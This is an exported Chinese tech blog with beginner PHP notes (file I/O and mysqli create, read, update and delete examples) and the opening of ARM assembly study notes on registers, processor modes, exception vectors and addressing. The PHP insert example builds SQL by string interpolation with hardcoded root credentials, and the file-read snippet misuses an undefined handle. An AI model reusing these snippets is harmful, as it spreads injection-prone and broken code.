class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">fun1</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="comment">//code</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">fun1</span>()</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="文件操作"><a href="#文件操作" class="headerlink" title="文件操作"></a>文件操作</h3><h4 id="打开文件"><a href="#打开文件" class="headerlink" title="打开文件"></a>打开文件</h4><p><strong>语法</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">fopen</span>(<span class="string">&quot;文件地址&quot;</span>,<span class="string">&quot;打开方式&quot;</span>);</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/likunvs/images/main/images/image-20250413142616335.png" alt="image-20250413142616335"></p><h4 id="写入文件"><a href="#写入文件" class="headerlink" title="写入文件"></a>写入文件</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$file</span>=<span class="title function_ invoke__">fopen</span>(<span class="string">&quot;文件地址&quot;</span>,<span class="string">&quot;打开方式&quot;</span>);</span><br><span class="line"><span class="variable">$len</span>=<span class="title function_ invoke__">fwrite</span>(<span class="variable">$file</span>,<span class="string">&#x27;data&#x27;</span>);<span class="comment">//len是输入数据的字节数</span></span><br><span class="line"><span class="title function_ invoke__">fclose</span>(<span class="variable">$file</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h4 id="读取文件"><a href="#读取文件" class="headerlink" title="读取文件"></a>读取文件</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$file</span>=<span class="title function_ invoke__">fopen</span>(<span class="string">&quot;文件地址&quot;</span>,<span class="string">&quot;打开方式&quot;</span>);</span><br><span class="line">    <span class="comment">//fread(文件对象,文件长度);</span></span><br><span class="line">    <span class="comment">//filesize(文件对象); 函数获得文件大小</span></span><br><span class="line">    <span class="variable">$contents</span> = <span class="title function_ invoke__">fread</span>(<span class="variable">$handle</span>, <span class="title function_ invoke__">filesize</span> (<span class="variable">$file</span>));</span><br><span class="line">    <span class="title function_ invoke__">fclose</span>(<span class="variable">$handle</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="连接sql"><a href="#连接sql" class="headerlink" title="连接sql"></a>连接sql</h3><p>我这里没有实际操作，直接使用csdn 秦老师Q的代码</p><h4 id="新增数据"><a href="#新增数据" class="headerlink" title="新增数据"></a>新增数据</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"> </span><br><span class="line">// 连接数据库，添加数据</span><br><span class="line">// 步骤：1.创建连接 $db = new mysqli($数据库地址,$数据库账号,$数据库密码,$数据库名称);</span><br><span class="line">//      2.编写sql语句 $sql = &quot;insert into demo values($id,&#x27;$name&#x27;,$age)&quot;;</span><br><span class="line">//      3.执行sql语句 $rs = mysqli_query($db,$sql);</span><br><span class="line">//      4.处理结果  if($rs)&#123; echo &quot;添加成功！&quot;;&#125;</span><br><span class="line">//      5.关闭连接对象  mysqli_close($db);</span><br><span class="line"> </span><br><span class="line">    $dbservice = &quot;localhost&quot;; //ip地址</span><br><span class="line">    $dbusername = &quot;root&quot;;   //账号</span><br><span class="line">    $dbpassword = &quot;root&quot;;   //密码</span><br><span class="line">    $dbname = &quot;school&quot;;     //数据库名称</span><br><span class="line"> </span><br><span class="line">    // 1.创建数据库连接</span><br><span class="line">    $db = new mysqli($dbservice,$dbusername,$dbpassword,$dbname);</span><br><span class="line"> </span><br><span class="line">    //模拟用户数据</span><br><span class="line">    $id = 1;</span><br><span class="line">    $name = &quot;tom&quot;;</span><br><span class="line">    $age = 18;</span><br><span class="line"> </span><br><span class="line">    // 2.编写sql语句</span><br><span class="line">    $sql = &quot;insert into demo values($id,&#x27;$name&#x27;,$age)&quot;;</span><br><span class="line"> </span><br><span class="line">    // 3.执行sql语句  使用mysqli_query(数据库连接对象,sql语句)函数执行sql语句,获得执行结果</span><br><span class="line">    $rs = mysqli_query($db,$sql);</span><br><span class="line"> </span><br><span class="line">    // 4.处理执行结果  判断是否执行成功</span><br><span class="line">    if($rs)&#123;</span><br><span class="line">         echo &quot;添加成功！&quot;;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        echo &quot;添加失败！&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    // 5.关闭连接对象</span><br><span class="line">     mysqli_close($db);;</span><br><span class="line"> </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h4 id="修改数据"><a href="#修改数据" class="headerlink" title="修改数据"></a>修改数据</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    // 修改数据</span><br><span class="line">    // 创建连接</span><br><span class="line">    $conn = new mysqli(&quot;localhost&quot;,&quot;root&quot;,&quot;root&quot;,&quot;school&quot;);</span><br><span class="line"> </span><br><span class="line">    // 编写sql语句</span><br><span class="line">    $sql = &quot;update demo set id=2,name=&#x27;jar&#x27;,age=18 where id=1;&quot;;</span><br><span class="line"> </span><br><span class="line">    // 执行sql语句</span><br><span class="line">    $rs = mysqli_query($conn,$sql);</span><br><span class="line"> </span><br><span class="line">    if($rs)&#123;</span><br><span class="line">        echo &quot;修改成功&quot;;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        echo &quot;修改失败&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    // 关闭连接</span><br><span class="line">    mysqli_close($conn);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h4 id="删除数据"><a href="#删除数据" class="headerlink" title="删除数据"></a>删除数据</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    // 删除数据</span><br><span class="line">    // 创建连接</span><br><span class="line">    $conn = new mysqli(&quot;localhost&quot;,&quot;root&quot;,&quot;root&quot;,&quot;school&quot;);</span><br><span class="line"> </span><br><span class="line">    // 编写sql语句</span><br><span class="line">    $sql = &quot;delete from demo where id=1&quot;;</span><br><span class="line"> </span><br><span class="line">    // 执行sql语句  得到执行结果</span><br><span class="line">    $rs = mysqli_query($conn,$sql);</span><br><span class="line"> </span><br><span class="line">    // 处理执行结果</span><br><span class="line">    if($rs)&#123;</span><br><span class="line">        echo &quot;成功&quot;;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        echo &quot;失败&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    // 关闭连接</span><br><span class="line">    mysqli_close($conn);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h4 id="查询数据"><a href="#查询数据" class="headerlink" title="查询数据"></a>查询数据</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    // 查询数据</span><br><span class="line"> </span><br><span class="line">    $conn = new mysqli(&quot;localhost&quot;,&quot;root&quot;,&quot;root&quot;,&quot;school&quot;);</span><br><span class="line"> </span><br><span class="line">    $sql = &quot;select * from demo&quot;;</span><br><span class="line"> </span><br><span class="line">    $rs = mysqli_query($conn,$sql);</span><br><span class="line"> </span><br><span class="line">    if($rs)&#123;</span><br><span class="line">        echo &quot;查询成功&quot;;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        echo &quot;查询失败&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a href="https://blog.csdn.net/weixin_55584739/article/details/144511134?ops_request_misc=%7B%22request_id%22:%2296edc3be0dac69d6a703a853f9a16092%22,%22scm%22:%2220140713.130102334..%22%7D&request_id=96edc3be0dac69d6a703a853f9a16092&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-3-144511134-null-null.142%5Ev102%5Econtrol&utm_term=PHP%E5%AD%A6%E4%B9%A0&spm=1018.2226.3001.4187">php入门教程(超详细，一篇就够了!!!)-CSDN博客</a></p>]]></content>
      
      
      <categories>
          
          <category> web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ARM汇编语言学习笔记</title>
      <link href="/2025/05/12/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0/ARM%E6%B1%87%E7%BC%96%E5%AD%A6%E4%B9%A0/"/>
      <url>/2025/05/12/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0/ARM%E6%B1%87%E7%BC%96%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<h1 id="ARM汇编"><a href="#ARM汇编" class="headerlink" title="ARM汇编"></a>ARM汇编</h1><p><strong>前言</strong></p><p>在学习ARM汇编之前，笔者已经在快一年前学过X86汇编，当时是跟着B站小甲鱼的视频将王爽老的第四版汇编语言过了一遍，花了十多天，所以笔者在有些地方会加入自己的理解，若这篇文章有幸被您看见，遇见不对的地方尽可告诉笔者</p><h2 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h2><h3 id="指令集"><a href="#指令集" class="headerlink" title="指令集"></a>指令集</h3><p>一个计算机编程语言中有很多不同的命令，不同的计算机编程语言有不同的命令，而我们的CPU不可能将所有的命令都录入硬件，他只会提供最基础的功能，如加，减，乘，除，异或等等，我们称这为运算指令，而这些简单的指令相互作用却能实现任何复杂的功能，而编译器的作用正是将不同的高级语言编译为CPU可以识别的指令，而这些指令的集合我们就可以叫做指令集</p><p>如今市场上流行的指令集有很多X86指令集，ARM指令集，RISC-V指令集</p><p>他们作用于不同的领域，有着自己独特的优点和缺点</p><table><thead><tr><th align="left">架构</th><th align="left">典型设备</th><th align="left">特点</th><th align="left">例子</th></tr></thead><tbody><tr><td align="left"><strong>x86</strong></td><td align="left">PC&#x2F;服务器</td><td align="left">CISC、高性能、兼容性强</td><td align="left">Intel Core, AMD Ryzen</td></tr><tr><td align="left"><strong>ARM</strong></td><td align="left">手机&#x2F;嵌入式</td><td align="left">RISC、低功耗、精简指令</td><td align="left">Apple M1, 高通骁龙</td></tr><tr><td align="left"><strong>RISC-V</strong></td><td align="left">新兴领域</td><td align="left">开源、模块化设计</td><td align="left">物联网、科研芯片</td></tr></tbody></table><p>在RAM指令集中一条指令32位，4个字节</p><h3 id="微架构"><a href="#微架构" class="headerlink" title="微架构"></a>微架构</h3><p>微架构又称为处理器架构，总结就是指令集在CPU内部具体硬件电路的实现</p><p>一个指令集可以有不同的微架构，相同的微架构通过不同的配置如（处理器主频、核数、Cache大小等）可以设计出不同的处理器</p><p><img src="https://raw.githubusercontent.com/likunvs/images/main/images/image-20250422210022292.png" alt="image-20250422210022292"></p><h3 id="工作模式"><a href="#工作模式" class="headerlink" title="工作模式"></a>工作模式</h3><p>ARM处理器有多种模式，主要分为用户模式和特权工作模式，程序正常工作的时候，处理器处于用户模式，当处理器遇见中断或者异常时就会跳转到对应的特权工作模式</p><table><thead><tr><th>处理器模式</th><th>模式编码</th><th>模式介绍</th></tr></thead><tbody><tr><td>User mode</td><td>0B10000</td><td>应用程序正常运行时的工作模式</td></tr><tr><td>FIQ mode</td><td>0B10001</td><td>快速中断模式，中断优先级比IRQ高，用于处理高优先级中断请求</td></tr><tr><td>IRQ mode</td><td>0B10010</td><td>中断模式</td></tr><tr><td>Supervisor mode</td><td>0B10011</td><td>管理模式，用于处理中断和异常，复位和软中断时一般会进入该模式</td></tr><tr><td>Abort mode</td><td>0B10111</td><td>用于处理内存访问错误，指令读取失败时会进入该模式</td></tr><tr><td>Undefined mode</td><td>0B11011</td><td>CPU遇到无法识别的、未定义的指令，会进入该模式</td></tr><tr><td>System mode</td><td>0B11111</td><td>类似用户模式，但可以运行特权OS任务，如切换到其他模式</td></tr><tr><td>Monitor mode</td><td>0B10110</td><td>仅限于安全扩展</td></tr></tbody></table><h3 id="寄存器"><a href="#寄存器" class="headerlink" title="寄存器"></a>寄存器</h3><p>在ARM处理器的内部于X86处理器相同，均有ALU（算数逻辑单元实现算术运算和逻辑运算）和控制单元，和一系列实现不同功能的寄存器（通用寄存器，状态寄存器，控制寄存器）不同的是ARM有37个寄存器，但每种模式下最多只能访问18个</p><p><img src="https://raw.githubusercontent.com/likunvs/images/main/images/image-20250423200644151.png" alt="image-20250423200644151"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">总结：</span><br><span class="line">1、7个模式中除了user是普通模式以外，其他6个都是特权模式</span><br><span class="line">2、6个特权模式中，除了System模式以外，其他5个都是异常模式</span><br><span class="line">3、模式的切换是通过代码写CPSR寄存器进行主动切换的，或者CPU自动切换</span><br><span class="line">4、各种模式可访问的寄存器数量不同，操作权限不同，方便操作系统的安全等级需求</span><br><span class="line">——引自：CSDN-图南楠：《ARM的工作模式和37个寄存器》</span><br></pre></td></tr></table></figure><h4 id="通用寄存器"><a href="#通用寄存器" class="headerlink" title="通用寄存器"></a>通用寄存器</h4><p>在ARM处理器中的寄存器也分为通用寄存器和专用寄存器</p><p>除了在FIQ工作模式以外，通用寄存器都是共用，共享的</p><ul><li>R0~R3：一般用于传递函数参数</li><li>R4~R11： 用于保存函数运行中的中间结果和函数的局部变量</li><li>R12：常用于函数调用的临时寄存器</li></ul><h4 id="专用寄存器"><a href="#专用寄存器" class="headerlink" title="专用寄存器"></a>专用寄存器</h4><ul><li>R13：堆栈指针寄存器（StackPointer，SP），与X86SP寄存器（用于存储栈顶）相似的功能，不过R13似乎要求总是指向当前运行函数的栈帧，一般不能用作其他用途</li><li>R14：链接寄存器（Link Register，LR），在函数调用过程中主要用来保存上一级函数调用者的返回地址；</li><li>R15：程序计数器（Program Counter，PC），CPU从内存取指令执行，就是默认从PC保存的地址中取的（所以程序跳转时就是把目标地址代码放到PC中），每取一次指令，PC寄存器的地址值自动增加。这个功能有点类似于X86处理器的IP寄存器</li><li>CPSR：处理器状态寄存器（Current Processor State Register），用来表示处理器的运行状态。除了状态位和标志位，CPSR寄存器里也有一些控制位，用来切换处理器的工作模式。</li></ul><p><img src="https://raw.githubusercontent.com/likunvs/images/main/images/image-20250423202331528.png" alt="image-20250423202331528"></p><h3 id="异常中断处理"><a href="#异常中断处理" class="headerlink" title="异常中断处理"></a>异常中断处理</h3><h4 id="异常"><a href="#异常" class="headerlink" title="异常"></a>异常</h4><p>什么叫异常？CPU正常工作之外的都叫异常，中断也是异常其中一种，当异或发生的时候会强制打断我们当前程序的执行流程</p><p><strong>异常的中断的区别</strong></p><table><thead><tr><th align="left"><strong>特性</strong></th><th align="left"><strong>中断（Interrupt）</strong></th><th align="left"><strong>异常（Exception）</strong></th></tr></thead><tbody><tr><td align="left"><strong>触发源</strong></td><td align="left">外部硬件设备（如定时器、UART）</td><td align="left">处理器内部事件（指令执行错误、系统调用）</td></tr><tr><td align="left"><strong>同步性</strong></td><td align="left">异步（随时可能发生）</td><td align="left">同步（特定指令或条件触发）</td></tr><tr><td align="left"><strong>是否可屏蔽</strong></td><td align="left">可屏蔽（通过CPSR的I&#x2F;F位）</td><td align="left">不可屏蔽（如复位、硬错误）</td></tr><tr><td align="left"><strong>典型场景</strong></td><td align="left">处理外设数据（按键、网络包）</td><td align="left">除零错误、缺页、系统调用（SVC）</td></tr><tr><td align="left"><strong>优先级</strong></td><td align="left">IRQ&#x2F;FIQ优先级可配置</td><td align="left">异常优先级固定（如复位最高）</td></tr></tbody></table><h4 id="异常向量表"><a href="#异常向量表" class="headerlink" title="异常向量表"></a>异常向量表</h4><p>异常向量表是CPU硬件提供的，当异常发生时，CPU会保存当前的程序的PC值也就是程序执行的地址，当异常处理结束后又会根据PC值跳转回程序继续执行</p><table><thead><tr><th>地址</th><th>异常</th><th>来源</th></tr></thead><tbody><tr><td>0x00</td><td>复位（Reset）</td><td>复位引脚有效（也是系统刚上电时 CPU 跑到的第一个地址）</td></tr><tr><td>0x04</td><td>未定义指令（Undefined Instruction）</td><td>读到了无法解码的指令</td></tr><tr><td>0x08</td><td>软件中断（SWI，Software Interrupt）</td><td>指令引起的异常</td></tr><tr><td>0x0C</td><td>指令预取中止（Prefetch）</td><td>当程序试图执行一个非法的指令或没有执行权限的指令时，会产生该异常</td></tr><tr><td>0x10</td><td>数据访问终止（DataAbort）</td><td>当程序试图访问一个非法的内存地址或没有访问权限的内存地址时，会产生该异常</td></tr><tr><td>0x14</td><td>无操作（NOP）</td><td>—</td></tr><tr><td>0x18</td><td>外部中断（IRQ）</td><td>当外部设备向处理器发出中断请求时，会产生该异常</td></tr><tr><td>0x1C</td><td>快速中断（FIQ）</td><td>当某些设备需要快速响应时，可以使用该异常，该异常的优先级高于IRQ异常</td></tr></tbody></table><h2 id="ARM汇编特点"><a href="#ARM汇编特点" class="headerlink" title="ARM汇编特点"></a>ARM汇编特点</h2><p>ARM汇编采用的是RISC架构，CPU本身不能直接读取内存中的数据，想要读取内存中的数据只能通过寄存器，先将数据读取进寄存器，再对数据进行操作，所以将数据读取进寄存器和将寄存器中的数据输入进内存我们就可以通过LDR和STR指令组合来实现</p><ul><li>LDR（load register）指令将内存内容加载入通用寄存器。</li><li>STR（store register）指令将寄存器内容存入内存空间中。</li></ul><h2 id="ARM指令集格式标准"><a href="#ARM指令集格式标准" class="headerlink" title="ARM指令集格式标准"></a>ARM指令集格式标准</h2><p>ARM指令格式可以分为两个方面去看，一种是机器指令格式，一种是汇编指令格式</p><h3 id="机器指令格式"><a href="#机器指令格式" class="headerlink" title="机器指令格式"></a>机器指令格式</h3><p>这个是32位的指令集</p><p><img src="https://raw.githubusercontent.com/likunvs/images/main/images/image-20250423221155281.png" alt="image-20250423221155281"></p><ul><li><p>条件码：根据状态寄存器判断当前代码是否执行，一般指令都是无条件执行（1110）</p><p><img src="https://raw.githubusercontent.com/likunvs/images/main/images/image-20250423221450395.png" alt="image-20250423221450395"></p></li><li><p>指令码：也就是当前指令要执行何种操作，如加（add），减（sub）等等</p></li><li><p>目的寄存器和操作数1寄存器：用于表示操作使用的是哪些寄存器</p></li><li><p>操作数2：用于存放立即数</p></li></ul><h3 id="汇编指令格式"><a href="#汇编指令格式" class="headerlink" title="汇编指令格式"></a>汇编指令格式</h3><p><img src="https://raw.githubusercontent.com/likunvs/images/main/images/image-20250423221926529.png" alt="image-20250423221926529"></p><h4 id="1-指令助记符（Opcode）"><a href="#1-指令助记符（Opcode）" class="headerlink" title="1. 指令助记符（Opcode）"></a><strong>1. 指令助记符（Opcode）</strong></h4><ul><li><p><strong>作用</strong>：表示指令的基本操作（如<code>ADD</code>、<code>MOV</code>）。</p></li><li><p><strong>示例</strong>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ADD R1, R2, R3    ; Opcode = ADD</span><br></pre></td></tr></table></figure></li></ul><h4 id="2-执行条件（cond，可选）"><a href="#2-执行条件（cond，可选）" class="headerlink" title="2. 执行条件（cond，可选）"></a><strong>2. 执行条件（cond，可选）</strong></h4><ul><li><p><strong>作用</strong>：指定指令执行的条件（基于CPSR标志位）。</p></li><li><p><strong>常见条件码</strong>：</p><table><thead><tr><th>条件码</th><th>含义</th><th>标志位条件</th></tr></thead><tbody><tr><td>EQ</td><td>相等</td><td>Z&#x3D;1</td></tr><tr><td>NE</td><td>不相等</td><td>Z&#x3D;0</td></tr><tr><td>GT</td><td>有符号大于</td><td>Z&#x3D;0且N&#x3D;V</td></tr><tr><td>LT</td><td>有符号小于</td><td>N≠V</td></tr></tbody></table></li><li><p><strong>示例</strong>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ADDEQ R1, R2, R3  ; 仅当Z=1时执行加法</span><br></pre></td></tr></table></figure></li></ul><hr><h4 id="3-字符S（S，可选）"><a href="#3-字符S（S，可选）" class="headerlink" title="3. 字符S（S，可选）"></a><strong>3. 字符S（S，可选）</strong></h4><ul><li><p><strong>作用</strong>：控制指令是否更新CPSR状态标志（如Z、N、C、V）。</p><ul><li><strong>S&#x3D;1</strong>：更新标志位。</li><li><strong>S&#x3D;0</strong>（默认）：不更新。</li></ul></li><li><p><strong>示例</strong>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ADDS R1, R2, R3  ; R1=R2+R3，并更新CPSR</span><br><span class="line">ADD R1, R2, R3   ; 不更新CPSR</span><br></pre></td></tr></table></figure></li></ul><hr><h4 id="4-目标寄存器（Rd）"><a href="#4-目标寄存器（Rd）" class="headerlink" title="4. 目标寄存器（Rd）"></a><strong>4. 目标寄存器（Rd）</strong></h4><ul><li><p><strong>作用</strong>：存储指令结果的寄存器。</p></li><li><p><strong>示例</strong>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ADD R0, R1, R2  ; R0 = R1 + R2</span><br></pre></td></tr></table></figure></li></ul><hr><h4 id="5-操作数1的寄存器（Rn）"><a href="#5-操作数1的寄存器（Rn）" class="headerlink" title="5. 操作数1的寄存器（Rn）"></a><strong>5. 操作数1的寄存器（Rn）</strong></h4><ul><li><p><strong>作用</strong>：第一个源操作数寄存器。</p></li><li><p><strong>示例</strong>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ADD R0, R1, R2  ; Rn = R1</span><br></pre></td></tr></table></figure></li></ul><hr><h4 id="6-操作数2（operand2，可选）"><a href="#6-操作数2（operand2，可选）" class="headerlink" title="6. 操作数2（operand2，可选）"></a><strong>6. 操作数2（operand2，可选）</strong></h4><ul><li><p><strong>作用</strong>：第二个源操作数，可以是：</p><ul><li><strong>寄存器</strong>：<code>Rm</code>（如<code>R3</code>）。</li><li><strong>立即数</strong>：<code>#imm</code>（如<code>#0xFF</code>）。</li><li><strong>移位寄存器</strong>：<code>Rm, LSL #n</code>（如<code>R2, LSL #2</code>）。</li></ul></li><li><p><strong>示例</strong>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ADD R0, R1, R2, LSL #1  ; R0 = R1 + (R2&lt;&lt;1)</span><br><span class="line">MOV R0, #0x12           ; R0 = 0x12</span><br></pre></td></tr></table></figure></li></ul><h2 id="ARM寻址方式"><a href="#ARM寻址方式" class="headerlink" title="ARM寻址方式"></a>ARM寻址方式</h2><p><strong>寻址（Addressing）</strong> 是指 <strong>CPU 如何获取指令操作数（数据）的方式</strong>。</p><p>寻址的方式有很多种，有寄存器寻址、立即寻址、寄存器偏移寻址、寄存器间接寻址、基址寻址、多寄存器寻址、相对寻址等</p><h3 id="立即数寻址"><a href="#立即数寻址" class="headerlink" title="立即数寻址"></a>立即数寻址</h3><p>ARM指令中立即数是以#开头的，十六进制以0x开头</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ADD R1, R1, #1;将R1寄存器中值加1，并将结果保存到R1中</span><br><span class="line">MOV R1, #0xFF;将十六进制常数0xFF写到R1寄存器中</span><br><span class="line">MOV R1, #12;将十进制常数12放到R1寄存器中</span><br></pre></td></tr></table></figure><p><strong>小问题</strong></p><p>操作数2只有12位是怎么存储下32的数据的，需要将32位立即数放到寄存器R0中，汇编指令为：<code>MOV R0, #0x0000F200</code>，该指令经过汇编后对应的机器指令码为：<code>E3A00CF2</code>。结合前文所述机器指令的格式，其解释如下：</p><p><img src="https://raw.githubusercontent.com/likunvs/images/main/images/image-20250423231803155.png" alt="image-20250423231803155"></p><p>C代表的是什么意思，c的十进制是12，12*2&#x3D;24，我们将F2模拟是在32位中将他右移24位就是我们要的0x0000F200，当然这样有局限性，而真实情况是编译系统为我们提供了伪指令LDR，实现任意立即数直接载入寄存器</p><h3 id="寄存器寻址"><a href="#寄存器寻址" class="headerlink" title="寄存器寻址"></a>寄存器寻址</h3><h4 id="基本方式"><a href="#基本方式" class="headerlink" title="基本方式"></a>基本方式</h4><p>数据保存在寄存器中，直接通过寄存器对数据进行读写</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">MOV R1,R2</span><br><span class="line">ADD R1,R2,R3  ;将R2和R3的数据相加后给R1</span><br></pre></td></tr></table></figure><h4 id="寄存器偏移寻址"><a href="#寄存器偏移寻址" class="headerlink" title="寄存器偏移寻址"></a>寄存器偏移寻址</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">MOV R1,R2,LSL #3 ;R2=R1&lt;&lt;3 </span><br></pre></td></tr></table></figure><p>这个方式相较于基本方式多了一个移位的操作</p><p>常见的移位方式有以下几种：</p><table><thead><tr><th>移位方式</th><th>含义</th></tr></thead><tbody><tr><td>LSL</td><td>逻辑左移(乘)</td></tr><tr><td>LSR</td><td>逻辑右移(除)</td></tr><tr><td>ASL</td><td>算数左移，和LSL一样</td></tr><tr><td>ASR</td><td>算数右移，分正负来填充右移后的空余位，正0负1</td></tr><tr><td>ROR</td><td>循环右移</td></tr><tr><td>RRX</td><td>带扩展的循环右移，循环右移1位后左端用C填充，这种方式只移位1位，所以无须指定移位位数</td></tr></tbody></table><h4 id="寄存器间接寻址"><a href="#寄存器间接寻址" class="headerlink" title="寄存器间接寻址"></a>寄存器间接寻址</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">LDR R1, [R2];将R2中的值作为地址，取该内存地址上的数据，保存到R1</span><br><span class="line">STR R1, [R2];将R2中的值作为地址，将R1寄存器中的值写入该内存地址</span><br></pre></td></tr></table></figure><p>这个方式与汇编语言中的<code>mov ax,[bx]</code>比较想，只不过他写入和写出的操作分别使用的是LDR和STR</p><h4 id="基址加偏移地址寻址"><a href="#基址加偏移地址寻址" class="headerlink" title="基址加偏移地址寻址"></a>基址加偏移地址寻址</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td 